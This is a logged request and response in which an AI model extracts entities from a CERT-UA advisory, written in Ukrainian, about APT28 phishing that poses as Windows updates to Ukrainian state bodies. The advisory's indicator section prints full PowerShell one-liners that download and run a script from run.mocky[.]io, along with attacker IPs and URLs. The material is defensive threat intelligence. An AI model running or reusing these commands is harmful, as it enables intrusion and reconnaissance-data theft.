@@ -1,0 +1,136 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN RELATION TYPES ###
+- publishes: An organization or vendor officially releases or issues a security advisory, bulletin, or patch.
+- addresses-vulnerability-in: A security advisory or patch provides fixes for security vulnerabilities affecting a software product.
+- affects: A security vulnerability compromises or impacts a specific software product or component.
+- located-in: An organization, entity, or infrastructure is geographically or administratively based in a country or location.
+- part-of: An entity or component is a constituent sub-part of a larger system, suite, or organization.
+- hosts: An IP address, server, or domain hosts a specific file, malware payload, or service.
+- delivers: An exploit, campaign, or delivery mechanism drops or downloads a payload onto a target system.
+- exploits: A threat actor, malware, or campaign leverages a specific security vulnerability to compromise systems.
+- attacks: A threat actor compromises, targets, or executes unauthorized actions against a system, service, or organization.
+- communicates-with: A malware payload or host establishes network connections to an external IP address or server.
+- uses-malware: A threat actor utilizes or deploys a specific malware tool or family in their operations.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA протягом квітня 2023 року зафіксовано випадки розповсюдження серед державних органів України електронних листів з темою "Оновлення Windows", надісланих, начебто, від імені системних адміністраторів відомств. При цьому електронні адреси відправників, створені на публічному сервісі "@outlook.com", можуть формуватися з використанням справжнього прізвища та ініціалів співробітника.</p><p>Типовий лист містить "інструкцію" українською мовою щодо "оновлення для захисту від хакерських атак", а також графічні зображення процесу запуску командного рядка та виконання PowerShell-команди.</p><p>Згадана команда завантажить PowerShell-сценарій, який, імітуючи процес оновлення операційної системи, забезпечить завантаження й виконання наступного PowerShell-сценарію, призначеного для збору базової інформації про ЕОМ за допомогою команд "tasklist", "systeminfo", а також відправку отриманих результатів за допомогою HTTP запиту до API сервісу Mocky.</p><p>Рекомендуємо обмежити можливість запуску PowerShell користувачами та забезпечити моніторинг мережевих з'єднань до API сервісу Mocky.</p><p>Активність здійснюється групою APT28.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">powershell $update='windows';$url='https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='1e88179a-3105-4a5c-9eb3-aebea36e9c21';$scheme='http://';$url=$scheme+$command+'.mocky[.]io/'+$version+'/'+$updateid;$r=(new-object system.net.webclient).downloadstring($url);powershell $r;&amp;exit
+powershell $update='windows';$url='https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='3b44f33d-b6e5-4ec6-b120-99b6ac52f74b';$scheme='http://';$url=$scheme+$command+'.mocky[.]io/'+$version+'/'+$updateid;$r=(new-object system.net.webclient).downloadstring($url);powershell $r;&amp;exit
+powershell $update='windows';$url='https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='ef206b51-4cf4-4c93-90bf-1e66673315b0';$scheme='http://';$url=$scheme+$command+'.mocky[.]io/'+$version+'/'+$updateid;$r=(new-object system.net.webclient).downloadstring($url);powershell$r;&amp;exit
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">146[.]70.105.61 (@m247.ro)
+77[.]75.78.125 (Received)
+hXXp://mockbin[.]org/bin/4aa17a07-7635-4ee0-9f3a-449fcd91f342
+hXXp://mockbin[.]org/bin/e8bfd045-2b14-4afc-9372-b723f7d76918
+hXXp://mockbin[.]org/bin/b8427b58-7497-46cd-a5b2-6ff6a40b4592
+hXXp://run.mocky[.]io/v3/1e88179a-3105-4a5c-9eb3-aebea36e9c21
+hXXp://run.mocky[.]io/v3/3b44f33d-b6e5-4ec6-b120-99b6ac52f74b
+hXXp://run.mocky[.]io/v3/a4b6625c-226e-4dbc-baec-1dbd854b8015
+hXXp://run.mocky[.]io/v3/acea62da-ca05-46d1-bb80-0b036af7467c
+hXXp://run.mocky[.]io/v3/ef206b51-4cf4-4c93-90bf-1e66673315b0
+hXXp://run.mocky[.]io/v3/ef4c7798-fc09-42cd-8431-91a22d5728d9
+hXXp://run.mocky[.]io/v3/a261411d-b869-4877-86f5-307e32ed6afa
+mockbin[.]org (Легітимний сервіс Mocky)
+run.mocky[.]io (Легітимний сервіс Mocky)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (8.0s, in 2637 / out 623 tok, STOP) ===
+APT28 targeted state bodies of Ukraine using phishing emails disguised as Windows updates to execute PowerShell scripts and exfiltrate host reconnaissance data to the Mocky API service.
+
+{
+  "entities": [
+    {
+      "name": "APT28",
+      "kind": "threat actor",
+      "gloss": "A Russian state-sponsored cyber espionage group associated with the GRU."
+    },
+    {
+      "name": "державні органи України",
+      "kind": "government sector",
+      "gloss": "State and government bodies and agencies of Ukraine."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country located in Eastern Europe."
+    },
+    {
+      "name": "Windows",
+      "kind": "operating system",
+      "gloss": "A family of proprietary graphical operating systems developed by Microsoft."
+    },
+    {
+      "name": "PowerShell",
+      "kind": "command-line tool",
+      "gloss": "A task automation and configuration management framework developed by Microsoft."
+    },
+    {
+      "name": "Mocky",
+      "kind": "web service",
+      "gloss": "An online platform for mocking HTTP APIs and testing web applications."
+    },
+    {
+      "name": "run.mocky.io",
+      "kind": "internet domain",
+      "gloss": "A domain endpoint associated with the Mocky API simulation platform."
+    },
+    {
+      "name": "mockbin.org",
+      "kind": "internet domain",
+      "gloss": "A public web domain used to mock, log, and inspect HTTP requests."
+    },
+    {
+      "name": "146.70.105.61",
+      "kind": "ip address",
+      "gloss": "An IP address observed as network infrastructure in the reported malicious campaign."
+    },
+    {
+      "name": "77.75.78.125",
+      "kind": "ip address",
+      "gloss": "An IP address observed as network infrastructure in the reported malicious campaign."
+    }
+  ],
+  "relations": [
+    {
+      "head": "APT28",
+      "type": "attacks",
+      "tail": "державні органи України",
+      "evidence": "розповсюдження серед державних органів України... Активність здійснюється групою APT28."
+    },
+    {
+      "head": "державні органи України",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "державних органів України"
+    }
+  ],
+  "newRelationTypes": []
+}
